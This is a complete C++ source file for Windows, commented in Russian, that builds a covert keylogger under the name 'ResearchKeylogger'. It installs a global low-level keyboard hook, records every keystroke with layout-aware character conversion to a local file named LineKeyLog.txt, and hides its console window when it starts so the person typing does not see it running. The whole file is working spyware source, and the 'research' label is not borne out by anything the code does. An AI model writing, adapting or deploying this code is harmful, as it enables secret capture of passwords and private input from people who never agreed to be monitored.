#pragma warning(disable : 4996)
#include <iostream>
#include <fstream>
#include <windows.h>
#include <chrono>
#include <thread>
#include <shellapi.h>
#include <map>
#include <string>

class ResearchKeylogger {
private:
    bool isRunning;
    HHOOK keyboardHook;

    // Карта для виртуальных кодов клавиш
    std::map<DWORD, std::string> keyNames = {
        {VK_LWIN, "[Left Win]"},
        {VK_RWIN, "[Right Win]"},
        {VK_APPS, "[Apps]"},
        {VK_SHIFT, "[Shift]"},
        {VK_LSHIFT, "[Left Shift]"},
        {VK_RSHIFT, "[Right Shift]"},
        {VK_CONTROL, "[Ctrl]"},
        {VK_LCONTROL, "[Left Ctrl]"},
        {VK_RCONTROL, "[Right Ctrl]"},
        {VK_MENU, "[Alt]"},
        {VK_LMENU, "[Left Alt]"},
        {VK_RMENU, "[Right Alt]"},
        {VK_TAB, "[Tab]"},
        {VK_CAPITAL, "[Caps Lock]"},
        {VK_ESCAPE, "[Escape]"},
        {VK_SPACE, " "},
        {VK_RETURN, "[Enter]"},
        {VK_BACK, "[Backspace]"},
        {VK_DELETE, "[Delete]"},
        {VK_INSERT, "[Insert]"},
        {VK_HOME, "[Home]"},
        {VK_END, "[End]"},
        {VK_PRIOR, "[Page Up]"},
        {VK_NEXT, "[Page Down]"},
        {VK_UP, "[Up Arrow]"},
        {VK_DOWN, "[Down Arrow]"},
        {VK_LEFT, "[Left Arrow]"},
        {VK_RIGHT, "[Right Arrow]"},
        {VK_NUMLOCK, "[Num Lock]"},
        {VK_SCROLL, "[Scroll Lock]"},
        {VK_SNAPSHOT, "[Print Screen]"},
        {VK_PAUSE, "[Pause]"},
        {VK_ADD, "[Num +]"},
        {VK_SUBTRACT, "[Num -]"},
        {VK_MULTIPLY, "[Num *]"},
        {VK_DIVIDE, "[Num /]"},
        {VK_DECIMAL, "[Num .]"},
        {VK_NUMPAD0, "[Num 0]"},
        {VK_NUMPAD1, "[Num 1]"},
        {VK_NUMPAD2, "[Num 2]"},
        {VK_NUMPAD3, "[Num 3]"},
        {VK_NUMPAD4, "[Num 4]"},
        {VK_NUMPAD5, "[Num 5]"},
        {VK_NUMPAD6, "[Num 6]"},
        {VK_NUMPAD7, "[Num 7]"},
        {VK_NUMPAD8, "[Num 8]"},
        {VK_NUMPAD9, "[Num 9]"},
        {VK_OEM_1, "[;:]"},
        {VK_OEM_2, "[/?]"},
        {VK_OEM_3, "[`~]"},
        {VK_OEM_4, "[{[]"},
        {VK_OEM_5, "[\\|]"},
        {VK_OEM_6, "[}]"},
        {VK_OEM_7, "['\"]"},
        {VK_OEM_COMMA, "[,]"},
        {VK_OEM_PERIOD, "[.]"},
        {VK_OEM_MINUS, "[-]"},
        {VK_OEM_PLUS, "[+=]"}
    };

    // Функция для получения имени клавиши
    std::string GetKeyName(DWORD vkCode) {
        auto it = keyNames.find(vkCode);
        if (it != keyNames.end()) {
            return it->second;
        }

        // Для функциональных клавиш
        if (vkCode >= VK_F1 && vkCode <= VK_F24) {
            return "[F" + std::to_string(vkCode - VK_F1 + 1) + "]";
        }

        return "";
    }

    // Функция для получения символа с учетом раскладки
    std::string GetKeyChar(DWORD vkCode, DWORD scanCode) {
        // Получаем активное окно и его раскладку
        HWND foregroundWindow = GetForegroundWindow();
        DWORD threadId = GetWindowThreadProcessId(foregroundWindow, NULL);
        HKL keyboardLayout = GetKeyboardLayout(threadId);

        BYTE keyboardState[256];
        if (!GetKeyboardState(keyboardState)) {
            return "";
        }

        // Конвертируем с учетом раскладки
        WCHAR charBuffer[16];
        int result = ToUnicodeEx(vkCode, scanCode, keyboardState, charBuffer, 16, 0, keyboardLayout);

        if (result > 0) {
            // Конвертируем WideChar в MultiByte (UTF-8)
            char mbBuffer[16];
            int bytesWritten = WideCharToMultiByte(CP_UTF8, 0, charBuffer, result, mbBuffer, 16, NULL, NULL);
            if (bytesWritten > 0) {
                mbBuffer[bytesWritten] = '\0';
                return std::string(mbBuffer);
            }
        }

        return "";
    }

    // Функция для получения читаемого имени буквенной клавиши (английская раскладка)
    std::string GetLetterKeyName(DWORD vkCode, bool isShiftPressed = false) {
        // Буквенные клавиши A-Z
        if (vkCode >= 0x41 && vkCode <= 0x5A) {
            char letter = 'A' + (vkCode - 0x41);
            if (!isShiftPressed && !(GetKeyState(VK_CAPITAL) & 0x0001)) {
                letter = tolower(letter);
            }
            return std::string(1, letter);
        }

        // Цифровые клавиши 0-9
        if (vkCode >= 0x30 && vkCode <= 0x39) {
            return std::string(1, '0' + (vkCode - 0x30));
        }

        // Символьные клавиши (топовый ряд)
        std::map<DWORD, std::pair<std::string, std::string>> symbolKeys = {
            {0xBA, {";", ":"}}, {0xBB, {"=", "+"}}, {0xBC, {",", "<"}},
            {0xBD, {"-", "_"}}, {0xBE, {".", ">"}}, {0xBF, {"/", "?"}},
            {0xC0, {"`", "~"}}, {0xDB, {"[", "{"}}, {0xDC, {"\\", "|"}},
            {0xDD, {"]", "}"}}, {0xDE, {"'", "\""}}
        };

        auto it = symbolKeys.find(vkCode);
        if (it != symbolKeys.end()) {
            return isShiftPressed ? it->second.second : it->second.first;
        }

        return "";
    }

    static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
        if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
            KBDLLHOOKSTRUCT* kbStruct = (KBDLLHOOKSTRUCT*)lParam;

            // Пропускаем повторные нажатия (auto-repeat)
            if (kbStruct->flags & LLKHF_UP) {
                return CallNextHookEx(NULL, nCode, wParam, lParam);
            }

            // Открываем файл для добавления записей
            std::ofstream file("LineKeyLog.txt", std::ios::app);
            if (file.is_open()) {
                // Получаем время нажатия (только для специальных случаев)
                auto now = std::chrono::system_clock::now();
                auto time_t = std::chrono::system_clock::to_time_t(now);

                // Получаем строку времени и удаляем \n
                std::string timeStr = std::ctime(&time_t);
                if (!timeStr.empty() && timeStr.back() == '\n') {
                    timeStr.pop_back();
                }

                // Создаем временный объект для доступа к методам
                ResearchKeylogger logger;

                // Проверяем, является ли клавиша специальной
                std::string keyName = logger.GetKeyName(kbStruct->vkCode);
                if (!keyName.empty()) {
                        file << keyName;
                }
                else {
                    // Для обычных клавиш пытаемся получить символ с учетом раскладки
                    std::string keyChar = logger.GetKeyChar(kbStruct->vkCode, kbStruct->scanCode);
                    if (!keyChar.empty()) {
                        file << keyChar;
                    }
                    else {
                        // Если не получилось получить символ, используем английскую раскладку
                        bool isShiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
                        std::string letterName = logger.GetLetterKeyName(kbStruct->vkCode, isShiftPressed);
                        if (!letterName.empty()) {
                            file << letterName;
                        }
                        else {
                            file << "[VK_" << kbStruct->vkCode << "]";
                        }
                    }
                }
                file.close();
            }
        }
        return CallNextHookEx(NULL, nCode, wParam, lParam);
    }

public:

    void startResearch() {
        if (isRunning) return;

        // Создаем файл и записываем заголовок  
        std::ofstream file("LineKeyLog.txt", std::ios::app);
        if (file.is_open()) {
            auto now = std::chrono::system_clock::now();
            auto time_t = std::chrono::system_clock::to_time_t(now);
            std::string timeStr = std::ctime(&time_t);
            if (!timeStr.empty() && timeStr.back() == '\n') {
                timeStr.pop_back();
            }
            file << "\n=== Research Session Started: " << timeStr << " ===" << std::endl;
            file.close();
        }

        keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
        if (keyboardHook) {
            isRunning = true;

            // Бесконечный цикл для обработки сообщений
            MSG msg;
            while (GetMessage(&msg, NULL, 0, 0) && isRunning) {
                TranslateMessage(&msg);
                DispatchMessage(&msg);
            }
        }
    }
};

// Функция для скрытого запуска
void RunHiddenKeylogger() {
    ResearchKeylogger researcher;
    researcher.startResearch();
}


// Альтернативная main функция для совместимости
int main() {
    // Скрываем консоль
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    RunHiddenKeylogger();
    return 0;
}